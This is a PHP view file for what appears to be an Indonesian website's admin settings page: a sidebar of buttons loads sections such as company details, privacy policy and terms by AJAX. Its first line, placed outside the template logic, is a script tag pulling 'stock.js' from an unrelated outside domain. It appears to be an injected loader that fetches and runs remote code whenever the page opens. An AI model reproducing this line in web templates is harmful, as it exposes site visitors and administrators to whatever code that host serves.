<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script>
<?php $data=[
    ['title'=>"perusahaan","icon"=>"bx-building-house","label"=>"perusahaan","tambahan"=>""],
    ['title'=>"socmed","icon"=>"bx-globe","label"=>"Sosial Media","tambahan"=>""],
    ['title'=>"lokasi","icon"=>"bx-map-pin","label"=>"Lokasi","tambahan"=>""],
    ['title'=>"halaman","icon"=>"bx-layout","label"=>"halaman","tambahan"=>""],
    ['title'=>"privacy_policy","icon"=>"bx-lock-alt","label"=>"Kebijakan Privasi","tambahan"=>"Kebijakan_Privasi"],
    ['title'=>"tentang","icon"=>"bx-info-circle","label"=>"tentang","tambahan"=>"Tentang"],
    ['title'=>"syarat_ketentuan","icon"=>"bx-book-open","label"=>"syarat & ketentuan","tambahan"=>"Syarat_Ketentuan"],
    ['title'=>"pengaturan_cookie","icon"=>"bx-cookie","label"=>"Cookie","tambahan"=>"Pengaturan_Cookie"],
    ['title'=>"sejarah","icon"=>"bx-history","label"=>"sejarah","tambahan"=>""],
] ?>
<style>
    .sidenav {
        height: 100%;
        width: 19%;
        position: fixed;
        z-index: 1;
        overflow-x: hidden;
    }
    .main {
        float: right;
        width: 76%;
        margin-left: 256px;
    }
</style>

<div class="col-xl-12">
    <div class="row ">
        <div class="sidenav">
            <div class="">
                <?php foreach ($data as $val) :?>
                    <div class="row mb-2">
                        <div class="col-md-12">
                            <button style="width: 100%;text-align: left!important;" id="id-<?=$val['title']?>" onclick="setPage('<?=$val['title']?>','<?=$val['tambahan']?>')" type="button" class="btn btn-outline-secondary">
                                <div class="d-flex flex-row">
                                    <i class="bx <?=$val["icon"]?> bx-sm"></i>&nbsp;
                                    <?=ucwords(_rplc("_"," ",$val['label']))?>
                                </div>
                            </button>
                        </div>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="main" id="result-content"></div>
    </div>
</div>

<script>
    var page     = <?=json_encode($data)?>;
    var title    = page[0].title;
    var oldTitle = "";
    var tambahan = page[0].tambahan;
    $(document).ready(function(){
        let activePage=getStorage("activePage");
        let activeTambahan=getStorage("activeTambahan");
        activePage==="null"||activePage===null||activePage===undefined?setPage(title,tambahan):setPage(activePage,activeTambahan);
    });

    function setPage(val,tambahan){
        attrId(`id-${oldTitle}`).removeClass('btn-primary');
        attrId(`id-${val}`).addClass('btn-outline-secondary');
        attrId(`id-${val}`).addClass('btn-primary');
        localStorage.setItem("activePage",val);
        localStorage.setItem("activeTambahan",tambahan);
        console.log("active page",val);

        title=val;
        oldTitle=val;
        loadContent(val,tambahan);
    }

    function loadContent(val,tambahan){
        let url = val+"/getView";
        if(tambahan!=="") url="tambahan/getview/"+tambahan;
        ajaxView(url,null,function(res){
            attrId("result-content").html(res);
            sessionPageActive = tambahan!==""?"tambahan/getview/"+tambahan:val;
        },true,true,false);
    }
</script>